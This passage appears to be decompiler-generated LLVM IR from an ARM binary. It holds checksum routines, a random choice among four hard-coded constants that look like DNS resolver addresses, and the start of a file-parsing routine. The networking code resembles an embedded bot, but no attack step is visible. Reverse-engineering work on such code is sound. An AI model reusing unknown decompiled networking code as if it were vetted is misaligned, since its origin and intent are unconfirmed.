  br i1 %v9_d9f0, label %dec_label_pc_d9fc, label %dec_label_pc_d9e8.dec_label_pc_d914_crit_edge

dec_label_pc_d9e8.dec_label_pc_d914_crit_edge:    ; preds = %dec_label_pc_d9e8
  %v1_d918.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d914

dec_label_pc_d9fc:                                ; preds = %dec_label_pc_d9e8, %dec_label_pc_d908
  %v0_d9fc = call i32 @function_f570()
  %v1_d9fc = trunc i32 %v0_d9fc to i16
  store i32 %v0_d9fc, i32* %r0.global-to-local, align 4
  store i32 %v3_d6fc, i32* @r3, align 4
  %v1_da04 = load i32, i32* @r5, align 4
  %v9_da04 = icmp eq i32 %v3_d6fc, %v1_da04
  store i1 %v9_da04, i1* %cpsr_z.global-to-local, align 1
  %v3_da08 = load i32, i32* @r4, align 4
  %v4_da08 = add i32 %v3_da08, 20
  %v5_da08 = inttoptr i32 %v4_da08 to i16*
  store i16 %v1_d9fc, i16* %v5_da08, align 2
  br i1 %v9_da04, label %dec_label_pc_da10, label %dec_label_pc_d9fc.dec_label_pc_d920_crit_edge

dec_label_pc_d9fc.dec_label_pc_d920_crit_edge:    ; preds = %dec_label_pc_d9fc
  %v1_d924.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d920

dec_label_pc_da10:                                ; preds = %dec_label_pc_d9fc, %dec_label_pc_d914
  %v0_da10 = call i32 @function_f570()
  %v1_da10 = trunc i32 %v0_da10 to i16
  store i32 %v0_da10, i32* %r0.global-to-local, align 4
  store i32 %v3_d700, i32* %r1.global-to-local, align 4
  %v1_da18 = load i32, i32* @r5, align 4
  %v9_da18 = icmp eq i32 %v3_d700, %v1_da18
  store i1 %v9_da18, i1* %cpsr_z.global-to-local, align 1
  %v3_da1c = load i32, i32* @r6, align 4
  %v4_da1c = add i32 %v3_da1c, 2
  %v5_da1c = inttoptr i32 %v4_da1c to i16*
  store i16 %v1_da10, i16* %v5_da1c, align 2
  br i1 %v9_da18, label %dec_label_pc_da24, label %dec_label_pc_d92c

dec_label_pc_da24:                                ; preds = %dec_label_pc_da10, %dec_label_pc_d920
  %v0_da24 = call i32 @function_f570()
  %v1_da24 = trunc i32 %v0_da24 to i16
  store i32 %v0_da24, i32* %r0.global-to-local, align 4
  %v3_da28 = load i32, i32* @r4, align 4
  %v4_da28 = add i32 %v3_da28, 28
  %v5_da28 = inttoptr i32 %v4_da28 to i16*
  store i16 %v1_da24, i16* %v5_da28, align 2
  br label %dec_label_pc_d92c

dec_label_pc_da30:                                ; preds = %dec_label_pc_d600, %dec_label_pc_d5e0, %dec_label_pc_d584, %dec_label_pc_d430
  %v0_da30 = call i32 @function_f570()
  %v1_da34 = urem i32 %v0_da30, 4
  store i32 %v1_da34, i32* %r0.global-to-local, align 4
  %v2_da38 = icmp eq i32 %v1_da34, 3
  store i1 %v2_da38, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_da30 to i2
  switch i2 %trunc, label %dec_label_pc_d67c3 [
    i2 0, label %dec_label_pc_dabc
    i2 1, label %dec_label_pc_daac
    i2 -2, label %dec_label_pc_da94
    i2 -1, label %dec_label_pc_da7c
  ]

dec_label_pc_da54:                                ; preds = %dec_label_pc_d748
  store i32 16384, i32* %r0.global-to-local, align 4
  %v1_da58 = call i32 @function_14898(i32 16384)
  %v2_da58 = trunc i32 %v1_da58 to i16
  store i32 %v1_da58, i32* %r0.global-to-local, align 4
  %v3_da5c = load i32, i32* %r5.global-to-local, align 4
  %v4_da5c = add i32 %v3_da5c, 6
  %v5_da5c = inttoptr i32 %v4_da5c to i16*
  store i16 %v2_da58, i16* %v5_da5c, align 2
  %v2_d7c8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_d7c4

dec_label_pc_da64:                                ; preds = %dec_label_pc_d6b0
  store i32 %v3_d6a0, i32* @r0, align 4
  %v1_da68 = call i32 @function_15b6c(i32 %v3_d6a0)
  store i32 %v1_da68, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_da6c

dec_label_pc_da6c:                                ; preds = %dec_label_pc_d688, %dec_label_pc_d67c, %dec_label_pc_da64
  %v1_da78 = phi i32 [ %v3_d6a0, %dec_label_pc_d688 ], [ %stack_var_-2172.0, %dec_label_pc_d67c ], [ %v1_da68, %dec_label_pc_da64 ]
  store i32 %v3_d430, i32* %r4.global-to-local, align 4
  store i32 %v6_d430, i32* %r5.global-to-local, align 4
  store i32 %v9_d430, i32* %r6.global-to-local, align 4
  ret i32 %v1_da78

dec_label_pc_da7c:                                ; preds = %dec_label_pc_da30
  store i32 67240450, i32* %r0.global-to-local, align 4
  %v1_da88 = call i32 @function_14874(i32 67240450)
  store i32 %v1_da88, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d67c

dec_label_pc_da94:                                ; preds = %dec_label_pc_da30
  store i32 1074151430, i32* %r0.global-to-local, align 4
  %v1_daa0 = call i32 @function_14874(i32 1074151430)
  store i32 %v1_daa0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d67c

dec_label_pc_daac:                                ; preds = %dec_label_pc_da30
  store i32 1246898730, i32* %r0.global-to-local, align 4
  %v1_dab0 = call i32 @function_14874(i32 1246898730)
  store i32 %v1_dab0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d67c

dec_label_pc_dabc:                                ; preds = %dec_label_pc_da30
  store i32 134744072, i32* %r0.global-to-local, align 4
  %v1_dac8 = call i32 @function_14874(i32 134744072)
  store i32 %v1_dac8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d67c

; uselistorder directives
  uselistorder i32 %v1_dac8, { 1, 0 }
  uselistorder i32 %v1_dab0, { 1, 0 }
  uselistorder i32 %v1_daa0, { 1, 0 }
  uselistorder i32 %v1_da88, { 1, 0 }
  uselistorder i32 %v1_da58, { 1, 0 }
  uselistorder i32 %v1_da34, { 1, 0 }
  uselistorder i32 %v0_da30, { 1, 0 }
  uselistorder i32 %v0_da24, { 1, 0 }
  uselistorder i32 %v0_da10, { 1, 0 }
  uselistorder i32 %v0_d9fc, { 1, 0 }
  uselistorder i32 %v0_d9e8, { 1, 0 }
  uselistorder i32 %v1_d9bc, { 1, 2, 0 }
  uselistorder i32 %v1_d9b8, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v4_d968, { 1, 0 }
  uselistorder i32 %v2_d948, { 1, 0 }
  uselistorder i1 %v3_d90c, { 1, 0 }
  uselistorder i1 %v3_d8f4, { 2, 3, 1, 0 }
  uselistorder i32 %v1_d8a8, { 1, 0 }
  uselistorder i32 %v0_d888, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v0_d874, { 2, 0, 3, 1 }
  uselistorder i32 %v0_d870, { 1, 0, 2 }
  uselistorder i32 %v1_d7a0, { 1, 0 }
  uselistorder i32 %v1_d734, { 1, 0, 2 }
  uselistorder i32 %v3_d728, { 1, 0 }
  uselistorder i32 %v0_d724, { 1, 0 }
  uselistorder i32 %v1_d718, { 1, 2, 0 }
  uselistorder i32 %v3_d6f8, { 0, 1, 2, 6, 3, 4, 5 }
  uselistorder i32 %v3_d6f4, { 1, 0, 5, 2, 3, 4 }
  uselistorder i1 %v7_d6d0, { 1, 0 }
  uselistorder i1 %v7_d6a4, { 1, 0 }
  uselistorder i32 %v3_d6a0, { 1, 3, 4, 5, 2, 0, 6 }
  uselistorder i32 %stack_var_-2172.0, { 0, 1, 3, 2 }
  uselistorder i32 %v2_d64c, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_d648, { 1, 0, 2 }
  uselistorder i1 %v7_d634, { 1, 0 }
  uselistorder i32 %v1_d630, { 1, 0, 2 }
  uselistorder i1 %v8_d628, { 1, 0 }
  uselistorder i1 %v7_d624, { 1, 0 }
  uselistorder i32 %v1_d618, { 1, 0 }
  uselistorder i8 %v2_d60c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_d610, { 1, 0 }
  uselistorder i32 %v0_d630, { 3, 0, 2, 1 }
  uselistorder i32 %v0_d600, { 0, 1, 3, 2 }
  uselistorder i32 %v1_d614, { 0, 2, 1 }
  uselistorder i32 %v2_d5e8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_d5e0, { 1, 0, 2, 3 }
  uselistorder i1 %v7_d5d8, { 1, 0 }
  uselistorder i32 %v0_d5d8, { 2, 3, 4, 1, 6, 5, 0 }
  uselistorder i32 %v2_d588, { 0, 2, 1, 3 }
  uselistorder i32 %v0_d57c, { 1, 0, 3, 2 }
  uselistorder i32 %v6_d54c, { 0, 1, 3, 2, 6, 7, 5, 4 }
  uselistorder i32 %v1_d4d0, { 1, 2, 0 }
  uselistorder i8 %v5_d488, { 1, 0 }
  uselistorder i32 %v6_d468, { 1, 0 }
  uselistorder i32 %v2_d450, { 0, 4, 5, 2, 1, 3 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8 }
  uselistorder i32* %r5.global-to-local, { 0, 16, 3, 1, 2, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 32, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 40, 9, 41, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 34, 33, 35, 37, 36, 39, 38, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 5, 8, 7, 9, 12, 10, 11, 13, 14, 15, 17, 16, 19, 18, 20, 21, 22, 24, 23, 25, 28, 26, 27, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 40, 39, 41, 44, 42, 43, 45, 46, 47, 48, 49, 50, 52, 51, 53, 54, 55, 56, 58, 57, 60, 59, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 26, 27, 28, 25, 22, 29, 30, 31 }
  uselistorder i32 41, { 4, 5, 6, 0, 2, 7, 1, 8, 3, 9 }
  uselistorder i32 (i32)* @function_148ac, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_da6c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d92c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d890, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %dec_label_pc_d7c4, { 1, 0 }
  uselistorder label %dec_label_pc_d644, { 1, 0 }
  uselistorder label %dec_label_pc_d634, { 1, 0 }
  uselistorder label %dec_label_pc_d600, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d5f8, { 1, 0 }
}

define i32 @function_dadc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_dadc:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_db00, label %dec_label_pc_dae8

dec_label_pc_dae8:                                ; preds = %dec_label_pc_dadc
  %v0_daf0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_daec

dec_label_pc_daec:                                ; preds = %dec_label_pc_daec, %dec_label_pc_dae8
  %v0_daf8 = phi i32 [ %v2_daf8, %dec_label_pc_daec ], [ 0, %dec_label_pc_dae8 ]
  %v0_daf0 = phi i32 [ %v5_daf0, %dec_label_pc_daec ], [ %v0_daf0.pre, %dec_label_pc_dae8 ]
  %v0_daec = phi i32 [ %v1_daec, %dec_label_pc_daec ], [ %arg1, %dec_label_pc_dae8 ]
  %v1_daec = add i32 %v0_daec, -2
  %v1_daf0 = inttoptr i32 %v0_daf0 to i16*
  %v2_daf0 = load i16, i16* %v1_daf0, align 2
  %v3_daf0 = zext i16 %v2_daf0 to i32
  %v5_daf0 = add i32 %v0_daf0, -2
  store i32 %v5_daf0, i32* @r0, align 4
  %v2_daf8 = add i32 %v3_daf0, %v0_daf8
  %v1_daec.cmp = icmp ugt i32 %v1_daec, 1
  br i1 %v1_daec.cmp, label %dec_label_pc_daec, label %dec_label_pc_db00.loopexit

dec_label_pc_db00.loopexit:                       ; preds = %dec_label_pc_daec
  br label %dec_label_pc_db00

dec_label_pc_db00:                                ; preds = %dec_label_pc_dadc, %dec_label_pc_db00.loopexit
  %v1_db08 = phi i32 [ %v2_daf8, %dec_label_pc_db00.loopexit ], [ 0, %dec_label_pc_dadc ]
  %v0_db00 = phi i32 [ %v1_daec, %dec_label_pc_db00.loopexit ], [ %arg1, %dec_label_pc_dadc ]
  %v7_db00 = icmp eq i32 %v0_db00, 1
  br i1 %v7_db00, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_db00
  %v1_db04 = load i32, i32* @r0, align 4
  %v2_db04 = inttoptr i32 %v1_db04 to i8*
  %v3_db04 = load i8, i8* %v2_db04, align 1
  %v4_db04 = zext i8 %v3_db04 to i32
  %v3_db08 = add i32 %v1_db08, %v4_db04
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_db00, %bb
  %v0_db0c = phi i32 [ %v1_db08, %dec_label_pc_db00 ], [ %v3_db08, %bb ]
  %v3_db10 = urem i32 %v0_db0c, 65536
  %v4_db14 = udiv i32 %v0_db0c, 65536
  %v5_db14 = add nuw nsw i32 %v4_db14, %v3_db10
  %v4_db18 = udiv i32 %v5_db14, 65536
  %v5_db18 = add nuw nsw i32 %v4_db18, %v5_db14
  %v1_db1c = urem i32 %v5_db18, 65536
  %v3_db24 = xor i32 %v1_db1c, 65535
  ret i32 %v3_db24

; uselistorder directives
  uselistorder i32 %v5_db14, { 1, 0 }
  uselistorder i32 %v5_daf0, { 1, 0 }
  uselistorder i32 %v1_daec, { 1, 0, 2 }
  uselistorder i32 %v0_daf0, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_db00, { 1, 0 }
}

define i32 @function_db2c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_db2c:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v0_db30 = load i32, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v1_db40 = add i32 %arg1, 12
  %v2_db40 = inttoptr i32 %v1_db40 to i32*
  %v3_db40 = load i32, i32* %v2_db40, align 4
  store i32 %v3_db40, i32* %r6.global-to-local, align 4
  %v1_db44 = add i32 %arg1, 16
  %v2_db44 = inttoptr i32 %v1_db44 to i32*
  %v3_db44 = load i32, i32* %v2_db44, align 4
  store i32 %v3_db44, i32* %r5.global-to-local, align 4
  %v7_db48 = icmp sgt i32 %v0_db30, 1
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v7_db48, label %dec_label_pc_db54.preheader, label %dec_label_pc_db68

dec_label_pc_db54.preheader:                      ; preds = %dec_label_pc_db2c
  %v0_db58.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_db54

dec_label_pc_db54:                                ; preds = %dec_label_pc_db54.preheader, %dec_label_pc_db54
  %v0_db60 = phi i32 [ 0, %dec_label_pc_db54.preheader ], [ %v2_db60, %dec_label_pc_db54 ]
  %v0_db58 = phi i32 [ %v0_db58.pre, %dec_label_pc_db54.preheader ], [ %v5_db58, %dec_label_pc_db54 ]
  %v0_db54 = phi i32 [ %v0_db30, %dec_label_pc_db54.preheader ], [ %v1_db54, %dec_label_pc_db54 ]
  %v1_db54 = add nsw i32 %v0_db54, -2
  %v1_db58 = inttoptr i32 %v0_db58 to i16*
  %v2_db58 = load i16, i16* %v1_db58, align 2
  %v3_db58 = zext i16 %v2_db58 to i32
  store i32 %v3_db58, i32* %r3.global-to-local, align 4
  %v5_db58 = add i32 %v0_db58, -2
  store i32 %v5_db58, i32* @r1, align 4
  %v2_db60 = add i32 %v3_db58, %v0_db60
  store i32 %v2_db60, i32* %r4.global-to-local, align 4
  %v8_db64 = icmp sgt i32 %v1_db54, 1
  br i1 %v8_db64, label %dec_label_pc_db54, label %dec_label_pc_db68.loopexit

dec_label_pc_db68.loopexit:                       ; preds = %dec_label_pc_db54
  br label %dec_label_pc_db68

dec_label_pc_db68:                                ; preds = %dec_label_pc_db68.loopexit, %dec_label_pc_db2c
  %v1_db74 = phi i32 [ %v2_db60, %dec_label_pc_db68.loopexit ], [ 0, %dec_label_pc_db2c ]
  %v0_db68 = phi i32 [ %v1_db54, %dec_label_pc_db68.loopexit ], [ %v0_db30, %dec_label_pc_db2c ]
  %v7_db68 = icmp eq i32 %v0_db68, 1
  br i1 %v7_db68, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_db68
  %v1_db701 = add i32 %arg1, 9
  %v2_db702 = inttoptr i32 %v1_db701 to i8*
  %v3_db703 = load i8, i8* %v2_db702, align 1
  br label %bb20

bb:                                               ; preds = %dec_label_pc_db68
  %v1_db6c = load i32, i32* @r1, align 4
  %v2_db6c = inttoptr i32 %v1_db6c to i8*
  %v3_db6c = load i8, i8* %v2_db6c, align 1
  %v4_db6c = zext i8 %v3_db6c to i32
  store i32 %v4_db6c, i32* %r3.global-to-local, align 4
  %v1_db70 = add i32 %arg1, 9
  %v2_db70 = inttoptr i32 %v1_db70 to i8*
  %v3_db70 = load i8, i8* %v2_db70, align 1
  %v3_db74 = add i32 %v4_db6c, %v1_db74
  store i32 %v3_db74, i32* %r4.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %.thread, %bb
  %v4_db705.in = phi i8 [ %v3_db703, %.thread ], [ %v3_db70, %bb ]
  %v4_db705 = zext i8 %v4_db705.in to i32
  %v1_db78 = call i32 @function_14898(i32 %v4_db705)
  %v0_db7c = load i32, i32* %r5.global-to-local, align 4
  %v0_db80 = load i32, i32* %r6.global-to-local, align 4
  %v3_db84 = urem i32 %v0_db80, 65536
  %v3_db88 = urem i32 %v0_db7c, 65536
  %v4_db90 = udiv i32 %v0_db80, 65536
  %v4_db94 = udiv i32 %v0_db7c, 65536
  %v1_db98 = load i32, i32* %r7.global-to-local, align 4
  %v1_db9c = load i32, i32* %r4.global-to-local, align 4
  %v2_db8c = add nuw nsw i32 %v4_db94, %v3_db88
  %v5_db90 = add nuw nsw i32 %v2_db8c, %v3_db84
  %v5_db94 = add nuw nsw i32 %v5_db90, %v4_db90
  %v2_db98 = add i32 %v5_db94, %v1_db98
  %v2_db9c = add i32 %v2_db98, %v1_db9c
  store i32 %v2_db9c, i32* %r3.global-to-local, align 4
  %v2_dba0 = add i32 %v2_db9c, %v1_db78
  %tmp = icmp ult i32 %v2_dba0, 65536
  br i1 %tmp, label %dec_label_pc_dbc0, label %dec_label_pc_dbac

dec_label_pc_dbac:                                ; preds = %bb20, %dec_label_pc_dbac
  %v2_dbb46 = phi i32 [ %v2_dbb4, %dec_label_pc_dbac ], [ %v2_dba0, %bb20 ]
  %v3_dbb87.in = phi i32 [ %v2_dbb4, %dec_label_pc_dbac ], [ %v2_dba0, %bb20 ]
  %v3_dbb87 = udiv i32 %v3_dbb87.in, 65536
  %v3_dbb0 = urem i32 %v2_dbb46, 65536
  %v2_dbb4 = add nuw nsw i32 %v3_dbb0, %v3_dbb87
  %tmp21 = icmp ult i32 %v2_dbb4, 65536
  br i1 %tmp21, label %dec_label_pc_dbc0.loopexit, label %dec_label_pc_dbac

dec_label_pc_dbc0.loopexit:                       ; preds = %dec_label_pc_dbac
  store i32 %v3_dbb0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_dbc0

dec_label_pc_dbc0:                                ; preds = %dec_label_pc_dbc0.loopexit, %bb20
  %v0_dbc0 = phi i32 [ %v2_dbb4, %dec_label_pc_dbc0.loopexit ], [ %v2_dba0, %bb20 ]
  %v1_dbc0 = urem i32 %v0_dbc0, 65536
  %v3_dbc8 = xor i32 %v1_dbc0, 65535
  ret i32 %v3_dbc8

; uselistorder directives
  uselistorder i32 %v2_dbb4, { 2, 1, 3, 0 }
  uselistorder i32 %v3_dbb0, { 1, 0 }
  uselistorder i32 %v2_dba0, { 3, 0, 2, 1 }
  uselistorder i32 %v2_db60, { 0, 2, 1 }
  uselistorder i32 %v5_db58, { 1, 0 }
  uselistorder i32 %v0_db58, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 %arg1, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_dbac, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_db54, { 1, 0 }
}

define i32 @function_dbd8(i32 %arg1) local_unnamed_addr {
dec_label_pc_dbd8:
  store i32 %arg1, i32* @r2, align 4
  %v2_dbe4 = load i32, i32* @global_var_22964.101, align 4
  store i32 %v2_dbe4, i32* @r0, align 4
  %v2_dbec = call i32 @function_14e24(i32 %v2_dbe4, i32 9)
  ret i32 %v2_dbec
}

define i32 @function_dc00(i32 %arg1) local_unnamed_addr {
dec_label_pc_dc00:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-585 = alloca i8, align 1
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-4681 = alloca i32, align 4
  %v3_dc00 = load i32, i32* @r4, align 4
  %v6_dc00 = load i32, i32* @r5, align 4
  %v9_dc00 = load i32, i32* @r6, align 4
  %v12_dc00 = load i32, i32* @r7, align 4
  %v15_dc00 = load i32, i32* @r8, align 4
  %v18_dc00 = load i32, i32* @sb, align 4
  %v21_dc00 = load i32, i32* @sl, align 4
  %v24_dc00 = load i32, i32* @fp, align 4
  %v27_dc00 = load i32, i32* @lr, align 4
  %v2_dc14 = ptrtoint i32* %stack_var_-4681 to i32
  store i32 %v2_dc14, i32* @sl, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_dc28 = ptrtoint i32* %stack_var_-8777 to i32
  store i32 %v2_dc28, i32* @fp, align 4
  %v3_dc34 = bitcast i32* %stack_var_-4681 to i8*
  %v4_dc34 = call i32 @function_15594(i8* %v3_dc34, i32 0, i32 4096)
  %v3_dc48 = bitcast i32* %stack_var_-8777 to i8*
  %v4_dc48 = call i32 @function_15594(i8* %v3_dc48, i32 0, i32 4096)
  %v2_dc4c = ptrtoint i8* %stack_var_-585 to i32
  store i32 %v2_dc4c, i32* @r6, align 4
  %v4_dc60 = call i32 @function_15594(i8* nonnull %stack_var_-585, i32 0, i32 513)
  %v0_dc6c = load i32, i32* @r4, align 4
  store i32 0, i32* @r4, align 4
  %v2_dc74 = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_dc74, i32* @sb, align 4
  store i32 0, i32* %stack_var_-56, align 4
  %v1_dc88 = call i32 @function_14a40(i32 %v0_dc6c)
  %v3_dc94 = trunc i32 %v1_dc88 to i8
  %v4_dc94 = call i32 @function_12870(i8 %v3_dc94, i32 16, i32 %v2_dc74)
  %v2_dc9c = call i32 @function_12370(i8* nonnull %stack_var_-72)
  %v7_dca0 = icmp eq i32 %v2_dc9c, 2
  br i1 %v7_dca0, label %dec_label_pc_e130, label %dec_label_pc_dca8

dec_label_pc_dca8:                                ; preds = %dec_label_pc_dc00, %dec_label_pc_e130
  %v1_dcac = call i32 @function_11ad8(i32 6)
  %v1_dcb4 = call i32 @function_11ad8(i32 7)
  %v1_dcbc = call i32 @function_11ad8(i32 9)
  %v0_dcc4 = load i32, i32* @r4, align 4
  %v3_dcc8 = call i32 @function_1312c(i32 ptrtoint ([14 x i8]* @global_var_19810.103 to i32), i32 %v0_dcc4)
  %v7_dccc = icmp eq i32 %v3_dcc8, -1
  store i32 %v3_dcc8, i32* @r8, align 4
  br i1 %v7_dccc, label %dec_label_pc_e0f0, label %dec_label_pc_dcd8.preheader

dec_label_pc_dcd8.preheader:                      ; preds = %dec_label_pc_dca8
  %v4_dce454 = call i32 @function_125d0(i8* nonnull %stack_var_-585, i32 512, i32 %v3_dcc8)
  %v2_dce856 = icmp eq i32 %v4_dce454, 0
  br i1 %v2_dce856, label %dec_label_pc_de70.loopexit, label %dec_label_pc_dcf0.lr.ph

dec_label_pc_dcf0.lr.ph:                          ; preds = %dec_label_pc_dcd8.preheader
  %v2_dd38 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_dcf0

dec_label_pc_dcf0:                                ; preds = %dec_label_pc_dcf0.lr.ph, %dec_label_pc_dcd8.backedge
  %v3_dcf4 = load i8, i8* %stack_var_-585, align 1
  %v4_dcf4 = sext i8 %v3_dcf4 to i32
  %v2_dcf8 = icmp eq i8 %v3_dcf4, 0
  br i1 %v2_dcf8, label %bb128, label %bb

bb:                                               ; preds = %dec_label_pc_dcf0
  %v8_dcfc = icmp eq i8 %v3_dcf4, 58
  br i1 %v8_dcfc, label %.thread6, label %dec_label_pc_dd10

.thread6:                                         ; preds = %bb
  br label %dec_label_pc_dd28

bb128:                                            ; preds = %dec_label_pc_dcf0
  br label %dec_label_pc_dd28

dec_label_pc_dd10:                                ; preds = %bb
  %v1_dd18.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_dd14

dec_label_pc_dd14:                                ; preds = %bb129, %dec_label_pc_dd10
  %v0_dd14 = phi i32 [ %v1_dd14, %bb129 ], [ 0, %dec_label_pc_dd10 ]
  %v1_dd14 = add i32 %v0_dd14, 1
  %v2_dd18 = add i32 %v1_dd14, %v1_dd18.pre
  %v3_dd18 = inttoptr i32 %v2_dd18 to i8*
  %v4_dd18 = load i8, i8* %v3_dd18, align 1
  %v6_dd18 = zext i8 %v4_dd18 to i32
  %v2_dd1c = icmp eq i8 %v4_dd18, 0
  br i1 %v2_dd1c, label %dec_label_pc_dd28, label %bb129

bb129:                                            ; preds = %dec_label_pc_dd14
  %v8_dd20 = icmp eq i8 %v4_dd18, 58
  br i1 %v8_dd20, label %dec_label_pc_dd28, label %dec_label_pc_dd14

dec_label_pc_dd28:                                ; preds = %dec_label_pc_dd14, %bb129, %bb128, %.thread6
  %v1_dd54 = phi i32 [ 0, %.thread6 ], [ 0, %bb128 ], [ %v1_dd14, %bb129 ], [ %v1_dd14, %dec_label_pc_dd14 ]
  %v0_dd28 = phi i32 [ %v4_dcf4, %.thread6 ], [ %v4_dcf4, %bb128 ], [ %v6_dd18, %bb129 ], [ %v6_dd18, %dec_label_pc_dd14 ]
  %v2_dd28 = icmp eq i32 %v0_dd28, 0
  br i1 %v2_dd28, label %dec_label_pc_dcd8.backedge, label %dec_label_pc_dd30

dec_label_pc_dcd8.backedge:                       ; preds = %dec_label_pc_dd28, %dec_label_pc_ddf8, %dec_label_pc_de38, %dec_label_pc_dd74
  %v0_dce0 = load i32, i32* @r8, align 4
  %v4_dce4 = call i32 @function_125d0(i8* nonnull %stack_var_-585, i32 512, i32 %v0_dce0)
  %v2_dce8 = icmp eq i32 %v4_dce4, 0
  br i1 %v2_dce8, label %dec_label_pc_de70.loopexit, label %dec_label_pc_dcf0

dec_label_pc_dd30:                                ; preds = %dec_label_pc_dd28
  %v1_dd34 = add i32 %v1_dd54, 2
  %v2_dd3c = add i32 %v1_dd34, %v2_dd38
  %v1_dd40 = add i32 %v2_dd3c, -545
  %v2_dd40 = inttoptr i32 %v1_dd40 to i8*
  %v3_dd40 = load i8, i8* %v2_dd40, align 1
  %v2_dd44 = icmp eq i8 %v3_dd40, 0
  br i1 %v2_dd44, label %bb131, label %bb130

bb130:                                            ; preds = %dec_label_pc_dd30
  %v8_dd48 = icmp eq i8 %v3_dd40, 32
  br i1 %v8_dd48, label %.thread10, label %dec_label_pc_dd54

.thread10:                                        ; preds = %bb130
  store i32 %v1_dd34, i32* @r5, align 4
  br label %dec_label_pc_dd74

bb131:                                            ; preds = %dec_label_pc_dd30
  store i32 %v1_dd34, i32* @r5, align 4
  br label %dec_label_pc_dd74

dec_label_pc_dd54:                                ; preds = %bb130
  %v0_dd54 = load i32, i32* @r6, align 4
  %v2_dd54 = add i32 %v0_dd54, %v1_dd54
  br label %dec_label_pc_dd5c

dec_label_pc_dd5c:                                ; preds = %bb132, %dec_label_pc_dd54
  %v0_dd6813 = phi i32 [ %v1_dd68, %bb132 ], [ %v1_dd34, %dec_label_pc_dd54 ]
  %v0_dd6c15 = phi i32 [ %v1_dd6c, %bb132 ], [ %v2_dd54, %dec_label_pc_dd54 ]
  %v1_dd5c = add i32 %v0_dd6c15, 3
  %v2_dd5c = inttoptr i32 %v1_dd5c to i8*
  %v3_dd5c = load i8, i8* %v2_dd5c, align 1
  %v2_dd60 = icmp eq i8 %v3_dd5c, 0
  br i1 %v2_dd60, label %.thread12, label %bb132

.thread12:                                        ; preds = %dec_label_pc_dd5c
  %v1_dd6814 = add i32 %v0_dd6813, 1
  store i32 %v1_dd6814, i32* @r5, align 4
  br label %dec_label_pc_dd74

bb132:                                            ; preds = %dec_label_pc_dd5c
